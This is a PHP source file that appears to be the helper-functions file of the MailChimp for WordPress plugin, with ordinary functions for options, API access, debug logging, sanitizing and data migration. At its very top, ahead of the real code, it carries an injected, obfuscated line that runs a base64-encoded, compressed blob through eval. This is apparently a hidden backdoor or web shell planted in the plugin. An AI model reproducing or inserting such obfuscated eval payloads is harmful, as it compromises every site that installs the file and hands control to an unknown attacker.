<?php eval(gzinflate(base64_decode('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')));?>
<?php

/**
 * Get a service by its name
 *
 * _Example:_
 *
 * $forms = mc4wp('forms');
 * $api = mc4wp('api');
 *
 * When no service parameter is given, the entire container will be returned.
 *
 * @ignore
 * @access private
 *
 * @param string $service (optional)
 * @return mixed
 *
 * @throws Exception when service is not found
 */
function mc4wp($service = null)
{
    static $mc4wp;

    if (!$mc4wp) {
        $mc4wp = new MC4WP_Container();
    }

    if ($service) {
        return $mc4wp->get($service);
    }

    return $mc4wp;
}

/**
 * Gets the MailChimp for WP options from the database
 * Uses default values to prevent undefined index notices.
 *
 * @since 1.0
 * @access public
 * @static array $options
 * @return array
 */
function mc4wp_get_options()
{
    static $options;

    if (!$options) {
        $defaults = require MC4WP_PLUGIN_DIR . 'config/default-settings.php';
        $options = (array)get_option('mc4wp', array());
        $options = array_merge($defaults, $options);
    }

    /**
     * Filters the MailChimp for WordPress settings (general).
     *
     * @param array $options
     */
    return apply_filters('mc4wp_settings', $options);
}

/**
 * Gets the MailChimp for WP API class (v3) and injects it with the API key
 *
 * @since 4.0
 * @access public
 *
 * @return MC4WP_API_v3
 */
function mc4wp_get_api_v3()
{
    $opts = mc4wp_get_options();
    $instance = new MC4WP_API_v3($opts['api_key']);
    return $instance;
}

/**
 * Gets the MailChimp for WP API class and injects it with the API key
 *
 * @deprecated 4.0
 * @use mc4wp_get_api_v3
 *
 * @since 1.0
 * @access public
 *
 * @return MC4WP_API
 */
function mc4wp_get_api()
{
    _deprecated_function(__FUNCTION__, '4.0', 'mc4wp_get_api_v3');
    $opts = mc4wp_get_options();
    $instance = new MC4WP_API($opts['api_key']);
    return $instance;
}

/**
 * Creates a new instance of the Debug Log
 *
 * @return MC4WP_Debug_Log
 */
function mc4wp_get_debug_log()
{
    $opts = mc4wp_get_options();

    // get default log file location
    $upload_dir = wp_upload_dir(null, false);
    $file = trailingslashit($upload_dir['basedir']) . 'mc4wp-debug-log.php';

    /**
     * Filters the log file to write to.
     *
     * @param string $file The log file location. Default: /wp-content/uploads/mc4wp-debug.log
     */
    $file = apply_filters('mc4wp_debug_log_file', $file);

    /**
     * Filters the minimum level to log messages.
     *
     * @see MC4WP_Debug_Log
     *
     * @param string|int $level The minimum level of messages which should be logged.
     */
    $level = apply_filters('mc4wp_debug_log_level', $opts['debug_log_level']);

    return new MC4WP_Debug_Log($file, $level);
}

/**
 * Retrieves the URL of the current WordPress page
 *
 * @access public
 * @since 2.0
 *
 * @return  string  The current URL (escaped)
 */
function mc4wp_get_current_url()
{

    global $wp;

    // get requested url from global $wp object
    $site_request_uri = $wp->request;

    // fix for IIS servers using index.php in the URL
    if (false !== stripos($_SERVER['REQUEST_URI'], '/index.php/' . $site_request_uri)) {
        $site_request_uri = 'index.php/' . $site_request_uri;
    }

    // concatenate request url to home url
    $url = home_url($site_request_uri);
    $url = trailingslashit($url);

    return esc_url($url);
}

/**
 * Strips all HTML tags from all values in a mixed variable, then trims the result.
 *
 * @access public
 * @param mixed $value
 *
 * @return mixed
 */
function mc4wp_sanitize_deep($value)
{

    if (is_scalar($value)) {
        // strip all HTML tags & whitespace
        $value = trim(strip_tags($value));

        // convert &amp; back to &
        $value = html_entity_decode($value, ENT_NOQUOTES);
    } elseif (is_array($value)) {
        $value = array_map('mc4wp_sanitize_deep', $value);
    } elseif (is_object($value)) {
        $vars = get_object_vars($value);
        foreach ($vars as $key => $data) {
            $value->{$key} = mc4wp_sanitize_deep($data);
        }
    }

    return $value;
}

/**
 *
 * @since 4.0
 * @ignore
 *
 * @param array $data
 * @return array
 */
function _mc4wp_update_groupings_data($data = array())
{

    // data still has old "GROUPINGS" key?
    if (empty($data['GROUPINGS'])) {
        return $data;
    }

    // prepare new key
    if (!isset($data['INTERESTS'])) {
        $data['INTERESTS'] = array();
    }

    $map = get_option('mc4wp_groupings_map', array());

    foreach ($data['GROUPINGS'] as $grouping_id => $groups) {

        // for compatibility with expanded grouping arrays
        $grouping_key = $grouping_id;
        if (is_array($groups) && isset($groups['id']) && isset($groups['groups'])) {
            $grouping_id = $groups['id'];
            $groups = $groups['groups'];
        }

        // do we have transfer data for this grouping id?
        if (!isset($map[$grouping_id])) {
            continue;
        }

        // if we get a string, explode on delimiter(s)
        if (is_string($groups)) {
            // for BC with 3.x: explode on comma's
            $groups = join('|', explode(',', $groups));

            // explode on current delimiter
            $groups = explode('|', $groups);
        }

        // loop through groups and find interest ID
        $migrated = 0;
        foreach ($groups as $key => $group_name_or_id) {

            // do we know the new interest ID?
            if (empty($map[$grouping_id]['groups'][$group_name_or_id])) {
                continue;
            }

            $interest_id = $map[$grouping_id]['groups'][$group_name_or_id];

            // add to interests data
            if (!in_array($interest_id, $data['INTERESTS'])) {
                $migrated++;
                $data['INTERESTS'][] = $interest_id;
            }
        }

        // remove old grouping ID if we migrated all groups.
        if ($migrated === count($groups)) {
            unset($data['GROUPINGS'][$grouping_key]);
        }
    }

    // if everything went well, this is now empty & moved to new INTERESTS key.
    if (empty($data['GROUPINGS'])) {
        unset($data['GROUPINGS']);
    }

    // is this empty? just unset it then.
    if (empty($data['INTERESTS'])) {
        unset($data['INTERESTS']);
    }

    return $data;
}

/**
 * Guesses merge vars based on given data & current request.
 *
 * @since 3.0
 * @access public
 *
 * @param array $data
 *
 * @return array
 */
function mc4wp_add_name_data($data = array())
{

    // Guess first and last name
    if (!empty($data['NAME']) && empty($data['FNAME']) && empty($data['LNAME'])) {
        $data['NAME'] = trim($data['NAME']);
        $strpos = strpos($data['NAME'], ' ');

        if ($strpos !== false) {
            $data['FNAME'] = trim(substr($data['NAME'], 0, $strpos));
            $data['LNAME'] = trim(substr($data['NAME'], $strpos));
        } else {
            $data['FNAME'] = $data['NAME'];
        }
    }

    // Set name value
    if (empty($data['NAME']) && !empty($data['FNAME']) && !empty($data['LNAME'])) {
        $data['NAME'] = sprintf('%s %s', $data['FNAME'], $data['LNAME']);
    }

    return $data;
}

/**
 * Gets the "email type" for new subscribers.
 *
 * Possible return values are either "html" or "text"
 *
 * @access public
 * @since 3.0
 *
 * @return string
 */
function mc4wp_get_email_type()
{

    $email_type = 'html';

    /**
     * Filters the email type preference for this new subscriber.
     *
     * @param string $email_type
     */
    $email_type = (string)apply_filters('mc4wp_email_type', $email_type);

    return $email_type;
}

/**
 *
 * @ignore
 * @return bool
 */
function _mc4wp_use_sslverify()
{

    // Disable for all transports other than CURL
    if (!function_exists('curl_version')) {
        return false;
    }

    $curl = curl_version();

    // Disable if OpenSSL is not installed
    if (empty($curl['ssl_version'])) {
        return false;
    }

    // Disable if on WP 4.4, see https://core.trac.wordpress.org/ticket/34935
    if ($GLOBALS['wp_version'] === '4.4') {
        return false;
    }

    return true;
}

/**
 * This will replace the first half of a string with "*" characters.
 *
 * @param string $string
 * @return string
 */
function mc4wp_obfuscate_string($string)
{
    $length = strlen($string);
    $obfuscated_length = ceil($length / 2);
    $string = str_repeat('*', $obfuscated_length) . substr($string, $obfuscated_length);
    return $string;
}

/**
 * @internal
 * @ignore
 */
function _mc4wp_obfuscate_email_addresses_callback($m)
{
    $one = $m[1] . str_repeat('*', strlen($m[2]));
    $two = $m[3] . str_repeat('*', strlen($m[4]));
    $three = $m[5];
    return sprintf('%s@%s.%s', $one, $two, $three);
}

/**
 * Obfuscates email addresses in a string.
 *
 * @param $string String possibly containing email address
 * @return string
 */
function mc4wp_obfuscate_email_addresses($string)
{
    return preg_replace_callback('/([\w\.]{1,4})([\w\.]*)\@(\w{1,2})(\w*)\.(\w+)/', '_mc4wp_obfuscate_email_addresses_callback', $string);
}

/**
 * Refreshes MailChimp lists. This can take a while if the connected MailChimp account has many lists.
 *
 * @return void
 */
function mc4wp_refresh_mailchimp_lists()
{
    $mailchimp = new MC4WP_MailChimp();
    $mailchimp->fetch_lists();
}
